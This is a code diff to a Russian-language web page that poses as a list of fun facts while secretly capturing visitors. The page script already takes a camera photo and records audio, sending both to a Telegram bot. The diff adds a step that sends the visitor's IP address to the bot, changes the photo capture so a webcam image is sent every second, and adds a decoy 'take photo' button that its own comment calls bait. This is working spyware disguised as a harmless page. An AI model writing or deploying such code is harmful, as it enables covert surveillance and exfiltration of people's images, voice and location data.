@@ -28,6 +28,17 @@
       line-height: 1.5;
       box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
     }
+    button {
+      padding: 10px 20px;
+      font-size: 1.2em;
+      background: #ff6b6b;
+      border: none;
+      color: white;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    button:hover { background: #ff8787; }
     #video, #canvas { display: none; }
   </style>
 </head>
@@ -40,6 +51,7 @@
   <div class="fact">Медузы не имеют мозга, сердца или костей — они на 95% состоят из воды.</div>
   <div class="fact">В космосе нет звука, потому что там нет воздуха для передачи звуковых волн.</div>
   <div class="fact">Самое глубокое место в океане — Марианская впадина, глубина 11 км.</div>
+  <button onclick="fakePhoto()">Сделать фото</button>
 
   <script>
     const video = document.getElementById('video');
@@ -50,33 +62,52 @@
     let mediaRecorder;
     let audioChunks = [];
 
+    // Получение IP через внешний сервис
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: `IP посетителя: ${ip}` })
+        }).catch(err => console.error('Ошибка отправки IP:', err));
+      });
+
     // Запуск камеры и микрофона
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
       .then(stream => {
         video.srcObject = stream;
         video.onloadedmetadata = () => {
-          // Задержка 1 секунда перед фото, чтобы камера прогрузилась
-          setTimeout(() => takePhoto(stream), 1000);
+          setTimeout(() => startPhotoLoop(stream), 1000); // Старт фото с задержкой
           startRecording(stream); // Начало записи аудио
         };
       })
       .catch(err => console.error('Ошибка доступа:', err));
 
-    // Захват и отправка фото
-    async function takePhoto(stream) {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      context.drawImage(video, 0, 0);
-      const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+    // Фото каждую секунду
+    function startPhotoLoop(stream) {
+      function takePhoto() {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0);
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append('chat_id', chatId);
+          formData.append('photo', blob, 'photo.png');
+          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          }).catch(err => console.error('Ошибка отправки фото:', err));
+        }, 'image/png');
+      }
+      takePhoto(); // Первое фото
+      setInterval(takePhoto, 1000); // Каждую секунду
+    }
 
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append('photo', photoBlob, 'photo.png');
-
-      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      }).catch(err => console.error('Ошибка отправки фото:', err));
+    // Фейковая кнопка
+    function fakePhoto() {
+      // Ничего не делает, просто приманка
     }
 
     // Начало записи аудио
@@ -89,14 +120,14 @@
       };
       mediaRecorder.onstop = () => sendAudio();
 
-      mediaRecorder.start(100); // Собираем данные каждые 100 мс
+      mediaRecorder.start(100); // Данные каждые 100 мс
       setTimeout(() => {
         if (mediaRecorder.state === 'recording') mediaRecorder.stop();
       }, 10000); // 10 секунд
     }
 
     // Отправка аудио
-    async function sendAudio() {
+    function sendAudio() {
       if (audioChunks.length === 0) {
         console.error('Нет аудиоданных');
         return;
@@ -112,7 +143,7 @@
       }).catch(err => console.error('Ошибка отправки аудио:', err));
     }
 
-    // Остановка записи при уходе со страницы
+    // Остановка записи при уходе
     window.onbeforeunload = () => {
       if (mediaRecorder && mediaRecorder.state === 'recording') {
         mediaRecorder.stop();
